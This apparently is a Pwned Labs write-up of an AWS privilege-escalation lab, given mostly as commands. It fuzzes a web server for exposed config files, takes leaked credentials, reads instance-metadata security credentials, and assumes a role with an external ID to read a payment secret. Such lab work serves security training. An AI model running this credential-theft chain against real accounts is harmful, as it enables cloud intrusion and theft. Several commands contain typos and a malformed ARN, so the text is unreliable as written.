#PwnedLabs - Assume Privileged Role with External ID

In this lab the goal is to assume privilege by utilizing an External ID that we find throughout our reconnaissance.

We found the IP 52.0.51.234 as our entry point and we would like to navigate laterally throughout their system, and determine any potential areas of impact.

First start off with an nmap scan of the target
nmap -Pn 52.0.52.234

We can fuzz the website to find any stored files that could be useful to us.

First we'll clone the site
git clone https://github.com/ffuf/ffuf ; cd ffuf ; go
get ; go build

wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/small.txt

./ffuf -w small.txt -u http://52.0.51.234/FUZZ -e .conf,.txt,.json,.xml,.yml,.yaml,.env -mc 200,301 2>/dev/null

curl http://52.0.51.234/config.json

once we get our cred we set them and we can see that we are the user data-bot. This user was also referenced in the S3 bucket hl-data-download. 

aws s3 ls hl-data-download

aws s3 cp s3://hl-data-download/LOG-1-TRANSACT.csv -

aws-enumerator enum --services all

aws-enmumerator dump -services secretsmanager

aws secretsmanager list-secrets --query 'SecretList[*]. [Name, Description, ARN] --output json

aws secretsmanager get-secret-value --secret-id ext/cost-optimization

TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"

aws iam list-attached-user-policies --user-name ext-cost-user

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest

aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4

aws iam get-role --role-name ExternalCostOpimizeAccess

aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment

aws iam get-policy-version --policy-arn arn:aws:iam:427648302155:policy/Payment --version-id v2

aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess

aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911

aws secretsmanager get-secret-value --secret-id billing/hl-default-payment
